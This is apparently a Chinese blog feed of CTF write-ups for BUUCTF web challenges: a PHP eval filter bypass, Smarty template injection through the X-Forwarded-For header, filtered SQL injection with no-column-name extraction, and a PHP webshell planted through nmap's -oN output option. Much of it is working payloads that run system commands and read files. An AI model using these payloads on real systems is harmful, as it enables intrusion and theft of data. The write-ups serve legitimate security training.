class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;a&#125;(<span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>输出：<br><img src="/images/2023-8-24_LoveMath/image-20230824152553792.png" alt="image-20230824152553792"></p><p>发现系统命令没有被执行，所以直接应用的方式是错误的，我们需要采用间接引用字符串的方式：</p><p><strong>测试:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824144645504.png" alt="image-20230824144645504"></p><p>发生了输出，说明system(dir)在没有echo的情况下依然可以输出内容</p><p>所以我们可以构造多句合法PHP代码使其存在于eval()函数中，使该函数执行多条PHP代码，然后我们在对其进行注入（类似于插入一句话木马）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>));<br><span class="hljs-variable">$$pi</span>&#123;a&#125;(<span class="hljs-variable">$$pi</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>输出:<br><img src="/images/2023-8-24_LoveMath/image-20230824152828967.png" alt="image-20230824152828967"></p><p>6.用间接引用简化payload(使用pi作为参数是因为它既是白名单字符串，同时也很短):</p><p>在PHP函数的参数中string类型都可以不用加双引号或单引号，PHP会自动进行解析,同时用GET或POST方法传输内容时也不需要””和’’:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153549268.png" alt="image-20230824153549268"></p><p>发现flag文件，将其打开查看:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153729500.png" alt="image-20230824153729500"></p><p>flag &#x3D; flag{26bb1d2a-6719-409c-88f7-14461687b994}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 华东南赛区]Web11 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/"/>
    <url>/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>1.打开网页后观察:</p><p><img src="/images/2023-8-23_Web11/image-20230823120850043.png" alt="image-20230823120850043"></p><p>根据网页显示的内容得，我们可能需要对网页的请求头进行更改</p><p>2.BP抓包:<br><img src="/images/2023-8-23_Web11/image-20230823121029643.png" alt="image-20230823121029643"></p><p>由网页显示的内容得，我们可能需要修改headers中的X-Forwarded-For</p><p>对该字段进行修改，先随便写一个IP：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121206963.png" alt="image-20230823121206963"></p><p>我们输入的内容在网页的Current IP中显示，即我们输入的内容可以被渲染传送到html中显示，所以猜测该字段存在ssti注入</p><p>3.判断是否存在模板注入:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121359664.png" alt="image-20230823121359664"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#123;&#125;&#125;中的代码被执行输出64，所以该字段存在ssti注入<br></code></pre></td></tr></table></figure><p>4.判断该模板的类型:<br>用判断是否为Smarty模板注入:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;$smarty.version&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121632709.png" alt="image-20230823121632709"></p><p>爆出版本信息:3.1.30,所以该网页使用的是smarty模板</p><p>5.使用ssti在Smarty模板中的恶意代码:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;ls /&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121828541.png" alt="image-20230823121828541"></p><p>发现有一个flag文件，查看flag文件的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121932270.png" alt="image-20230823121932270"></p><p>flag&#x3D;flag{0f8c1a6e-bf4c-4d5e-ad9e-f6282d3fe876}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[SWPU2019]Web1 题解</title>
    <link href="/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/"/>
    <url>/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>1.点击网页之后，注册一个账户，然后登录(登录界面和注册界面的sql注入已经测试，发现没有用):<br><img src="/images/2023-08-23_Web1/image-20230823141144322.png" alt="image-20230823141144322"></p><p>2.点击申请一个广告:</p><p><img src="/images/2023-08-23_Web1/image-20230823141243172.png" alt="image-20230823141243172"></p><p>在该页面中也存在疑似注入点，先随机申请一个广告:<br><img src="/images/2023-08-23_Web1/image-20230823141351148.png" alt="image-20230823141351148"></p><p>3.点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823141456102.png" alt="image-20230823141456102"></p><p>显示了该广告的内容</p><p>4.猜测该页面的事务处理逻辑：<br><strong>申请广告页面:</strong></p><p>insert into table VALUES(“广告名”,”广告内容”,……..);</p><p><strong>index.php显示内容：</strong><br>select * from table</p><p><strong>广告详情页面:</strong></p><p>select * from table where 广告名 &#x3D;’从界面列表中获取的广告名’</p><p><strong>验证猜测：</strong></p><p>在申请广告页面中:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">广告名:1&#x27;<br>广告内容:aaaaa<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823142529330.png" alt="image-20230823142529330"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823142551729.png" alt="image-20230823142551729"></p><p>发生sql报错，所以可以证实我们的猜想，广告详情存在sql注入漏洞:<br>select * from table where 广告名 &#x3D;’1’’</p><p>5.sql注入:<br><strong>第一步，爆字段：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union select 1,2,3 #<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143036837.png" alt="image-20230823143036837"></p><p>发现对输入内容进行了过滤,对输入内容进行判断，看看它过滤了哪些内容:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143210775.png" alt="image-20230823143210775"></p><p>可以进行申请，但是在显示的内容中空格被消除了，说明网页对空格进行了处理:<br><strong>对空格进行绕过:</strong><br><img src="/images/2023-08-23_Web1/image-20230823143443665.png" alt="image-20230823143443665"></p><p>所以空格可以用&#x2F;**&#x2F;代替</p><p><img src="/images/2023-08-23_Web1/image-20230823144042281.png" alt="image-20230823144042281"></p><p>所以也可以用()绕过空格</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144331977.png" alt="image-20230823144331977"></p><p>没有过滤select</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144539306.png" alt="image-20230823144539306"></p><p>说明该站点过滤了#</p><p><strong>#号绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823145455569.png" alt="image-20230823145455569"></p><p>所以可以用&#x2F;**&#x2F;‘通过闭合’绕过</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823145739643.png" alt="image-20230823145739643"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823145919546.png" alt="image-20230823145919546"></p><p>成功爆出字段不一致的错误，说明当前注入方式正确，现在只要一步步添加上去或减少，来确认它到底有多少字段(也可以用order by 或group by 来判断有多少字段),最终添加到22的时候成功:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823150404948.png" alt="image-20230823150404948"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823150443148.png" alt="image-20230823150443148"></p><p>没有报错，说明当前表总共有22个字段,且由显示的内容得，只显示了2，3，说明该数据表的内容在html中（在数据库中select一定是全部搜索出来的）只显示第二个字段和第三个字段，所以我们要爆的内容也只能在这两个字段中显示</p><p><strong>第二步，爆数据库</strong>：</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823151000019.png" alt="image-20230823151000019"></p><p>爆出数据库只有web1</p><p><strong>第三步，爆表：</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables/**/where/**/table_schema=DATABASE()/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152137236.png" alt="image-20230823152137236"></p><p>对输入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152224914.png" alt="image-20230823152224914"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152317844.png" alt="image-20230823152317844"></p><p>猜测敏感词汇为information_schema.tables</p><p><strong>information_schema.tables绕过：</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823152947582.png" alt="image-20230823152947582"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153243260.png" alt="image-20230823153243260"></p><p>点击广告详情:<br><img src="/images/2023-08-23_Web1/image-20230823153322133.png" alt="image-20230823153322133"></p><p>爆出两张表:ads,users</p><p><strong>第四步，爆表的字段：</strong></p><p>先爆ads的字段</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS/**/where table_schema=&#x27;web1&#x27;/**/and/**/table_name=&#x27;ads&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153803945.png" alt="image-20230823153803945"></p><p>对注入内容进行一一判断:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">group_concat(column_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153845408.png" alt="image-20230823153845408"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153914234.png" alt="image-20230823153914234"></p><p>猜测可能是对information_schema.COLUMNS进行了过滤</p><p><strong>information_schema.COLUMNS绕过:</strong></p><p>由于无法绕过information_schema.COLUMNS，但是在已经知道表明的情况下可以采用无列名爆破法:</p><p>参考:[<a href="https://blog.csdn.net/shinygod/article/details/123681039">SWPU2019]Web1 1_succ3的博客-CSDN博客</a></p><p>参考的payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">普通的sq查询<br>select * from users<br><br>查询表，并把列名替换为1，2，3.4，5，6<br>select 1,2,3,4,5 ,6 union select * from users<br><br>单独把第四列提出来，(select 1,2,3,4,5,6 union select * from users)a给查询结果命名<br> select `4` from (select 1,2,3,4,5,6 union select * from users)a;<br><br>若反引号被过滤，可以这样<br>select b from (select 1,2,3 as b,4,5 union select * from users)a;<br><br>测试:<br>-- 在已经知道beanbook表，但是不知道其字段名的情况下，爆出该表的字段值<br>-- 爆出第3列的值,把3当作第三列的字段名<br>select `3` from <br>(select 1,2,3,4,5,6 union select * from beanbook) as b<br><br>-- 爆出第1列的值，把别名a当作第一列的字段名<br>select a from <br>(select 1 as a,2,3,4,5,6 union select * from beanbook) as b<br></code></pre></td></tr></table></figure><p>无列名爆破法测试:</p><p>第一种:</p><p><img src="/images/2023-08-23_Web1/image-20230823155738540.png" alt="image-20230823155738540"></p><p>第二种:<br><img src="/images/2023-08-23_Web1/image-20230823155947247.png" alt="image-20230823155947247"></p><p>根据无名列爆破的payload,我们先要确认该表有多少个字段:</p><p>（flag在users表中，所以在这里省略对ads表的判断，思路和users表一样）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161617410.png" alt="image-20230823161617410"></p><p>继续添加字段，（省略两个字段的判断）</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b,2,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161924192.png" alt="image-20230823161924192"></p><p>回显了第一列的所有内容，说明users表的字段有三个</p><p>回显第二个字段的内容:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162104825.png" alt="image-20230823162104825"></p><p>发现了flag,但是不是flag的内容，说明flag内容在第三个字段中</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162243017.png" alt="image-20230823162243017"></p><p>flag&#x3D;flag{507104d6-24f2-405b-8de5-f60bdc690138}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[网鼎杯 2020 朱雀组]Nmap 题解</title>
    <link href="/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/"/>
    <url>/2023/08/22/2023-08-22-%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>1.有题目提示得这是一道考察Nmap执行的题目:<br><img src="/images/2023-08-22_Nmap/image-20230822100327583.png" alt="image-20230822100327583"></p><p>输入框中我们可以输入ip地址或hostname</p><p>测试:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1<br></code></pre></td></tr></table></figure><p>响应结果:</p><p><img src="/images/2023-08-22_Nmap/image-20230822100434322.png" alt="image-20230822100434322"></p><p>2.在kali中测试nmap:</p><p>nmap对ip地址的处理</p><p><strong>扫描IP地址:</strong></p><p>nmap 127.0.0.1:<br><img src="/images/2023-08-22_Nmap/image-20230822101659678.png" alt="image-20230822101659678"></p><p>返回的结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Not shown: 1000 closed tcp ports (conn-refused)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds<br></code></pre></td></tr></table></figure><p>而网站中的返回结果为:</p><p><img src="/images/2023-08-22_Nmap/image-20230822102909620.png" alt="image-20230822102909620"></p><p>两者的返回结果都是TCP协议，然后有Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</p><p>**扫描指定IP地址(ping 扫描)**：<br><img src="/images/2023-08-22_Nmap/image-20230822103048486.png" alt="image-20230822103048486"></p><p>返回结果中没有表明是TCP协议</p><p>所以一般网站使用TCP返回，都是nmap扫描或nmap -sT 扫描(默认是nmap)</p><p>猜测该网址的扫描形式为:nmap “输入的ip地址”</p><p>2.nmap扫描漏洞利用:</p><p>nmap中可以用于将扫描结果写文件并输出保存在本地的命令:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">-oN (标准输出)<br><br>-oX (XML输出)<br><br>-oS (ScRipT KIdd|3 oUTpuT)<br><br>-oG (Grep输出)<br><br>-oA (输出至所有格式)<br></code></pre></td></tr></table></figure><p>测试:<br>nmap  127.0.0.1 -oN test.txt:<br><img src="/images/2023-08-22_Nmap/image-20230822104553681.png" alt="image-20230822104553681"></p><p>发现在当前文件夹中生成了一个test.txt文件</p><p>所以我们可以利用输出这个漏洞，将一句话木马写入文件中，利用该输出漏洞将一句话木马文件保存到网页的当前文件夹中，就可以实现注入</p><p>测试2:</p><p>测试网页是否可以进行输出命令的执行:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1 -oN test.txt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105255949.png" alt="image-20230822105255949"></p><p>网页成功回显，且返回的结果和测试的结果相似，说明该指令被成功执行，所以我们就可以构造注入payload</p><p>3.构造一句话木马:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  -oN pass.php<br></code></pre></td></tr></table></figure><p>响应结果:<br><img src="/images/2023-08-22_Nmap/image-20230822105623631.png" alt="image-20230822105623631"></p><p>发现输入的结果可能被过滤,采用第二个payload试试<br>payload2:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; -oN pass.php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822105915275.png" alt="image-20230822105915275"></p><p>依然被过滤</p><p>4.现在就要一个个进行判断，寻找被过滤的内容:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; <br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115002077.png" alt="image-20230822115002077"></p><p>存在黑名单内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115127287.png" alt="image-20230822115127287"></p><p>由于该文件不可被识别，所以就无法显示内容</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115207663.png" alt="image-20230822115207663"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?ph<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822115311166.png" alt="image-20230822115311166"></p><p>所以过滤的内容为php,我们需要绕过php判断</p><p><strong>php一句话木马的构造</strong></p><p>可以解析php文件的后缀名:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">.php2<br>.php3<br>.php4<br>.php5<br>.phtml<br></code></pre></td></tr></table></figure><p>phtml:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;666&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">666<br></code></pre></td></tr></table></figure><p>php短标签：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  #前提是开启配置参数short_open_tags=on<br>&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;  #不需要开启参数设置<br>&lt;% echo &#x27;123&#x27;;%&gt;   #开启配置参数asp_tags=on，并且只能在7.0以下版本使用<br>&lt;script language=&quot;php&quot;&gt;echo &#x27;123&#x27;; &lt;/script&gt; #不需要修改参数开关，但是只能在7.0以下可用。<br></code></pre></td></tr></table></figure><p>测试:<br><? echo '123';?> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;888&quot;</span>;<br><span 